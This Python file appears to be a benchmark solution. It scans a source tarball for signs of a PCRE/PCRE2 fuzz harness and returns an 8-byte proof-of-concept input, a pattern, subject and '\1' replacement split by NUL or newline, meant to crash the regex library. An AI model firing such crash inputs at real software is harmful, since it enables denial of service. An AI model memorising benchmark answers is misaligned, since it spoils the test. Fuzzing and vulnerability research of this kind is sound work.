import os
import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        def read_text_members(tar):
            texts = {}
            for m in tar.getmembers():
                if not m.isfile():
                    continue
                name_l = m.name.lower()
                if name_l.endswith(('.c', '.cc', '.cpp', '.h', '.hpp', '.cxx', '.txt', '.md', 'makefile', 'cmakelists.txt', '.cmake', 'meson.build', 'configure.ac', 'configure.in')):
                    try:
                        f = tar.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(200000)
                        try:
                            text = data.decode('utf-8', errors='ignore')
                        except Exception:
                            text = data.decode('latin-1', errors='ignore')
                        texts[m.name] = text
                    except Exception:
                        pass
            return texts

        def detect_format(texts):
            # Returns ('pcre2'|'pcre1'|'other', 'split': 'nul'|'newline'|'unknown', 'use_substitute': bool)
            lib = 'other'
            use_substitute = False
            split = 'unknown'
            for path, txt in texts.items():
                if re.search(r'\bpcre2(_|\.h)', txt) or 'PCRE2_' in txt:
                    lib = 'pcre2'
                if re.search(r'\bpcre(_|\.h)', txt) or 'PCRE_' in txt:
                    if lib != 'pcre2':
                        lib = 'pcre1'
                if 'pcre2_substitute' in txt or 'pcre_substitute' in txt:
                    use_substitute = True
                if 'LLVMFuzzerTestOneInput' in txt or 'main(' in txt:
                    if re.search(r'memchr\s*\(\s*.*?,\s*0\s*,', txt) or 'strnlen((const char*)data' in txt or 'strnlen((char*)data' in txt or 'memrchr((const char*)data' in txt or 'find(\'\\0\')' in txt:
                        split = 'nul'
                    if re.search(r"memchr\s*\(\s*.*?,\s*'\\n'\s*,", txt) or '\\n' in txt and 'std::getline' in txt or 'getline' in txt:
                        # Heuristic for newline-based splitting
                        if split != 'nul':
                            split = 'newline'
            return lib, split, use_substitute

        # Default PoC: designed for PCRE2/PCRE1 fuzzers that split by NUL into pattern/subject[/replacement]
        # Pattern: "a" (no capturing groups)
        # Subject: "a"
        # Replacement: "\1" + extra chars (if substitute path is used)
        # Total length 8 bytes.
        poc_nul_subst = b"a\x00a\x00\\1XY"  # 8 bytes
        # For match-only harnesses (pattern + subject)
        poc_nul_match = b"a\x00aXYZ"  # 6 bytes; pad to 8 by adding 2 NOP chars
        if len(poc_nul_match) < 8:
            poc_nul_match = poc_nul_match + b"Z" * (8 - len(poc_nul_match))

        # For newline-separated formats: pattern\nsubject[\nreplacement]
        poc_nl_subst = b"a\n\\1\nXYZ"  # 8 bytes: pattern 'a', replacement '\1' (subject may be empty or implicit)
        poc_nl_match = b"a\na\nXX"     # 6 bytes -> pad
        if len(poc_nl_match) < 8:
            poc_nl_match = poc_nl_match + b"Z" * (8 - len(poc_nl_match))

        try:
            with tarfile.open(src_path, 'r:*') as tar:
                texts = read_text_members(tar)
        except Exception:
            # Fallback to a robust NUL-delimited PoC
            return poc_nul_subst

        lib, split, use_substitute = detect_format(texts)

        if split == 'nul':
            if use_substitute:
                return poc_nul_subst
            else:
                return poc_nul_match
        if split == 'newline':
            if use_substitute:
                return poc_nl_subst
            else:
                return poc_nl_match

        # Unknown split: Prefer NUL polyglot that still looks sane for newline readers
        return poc_nul_subst
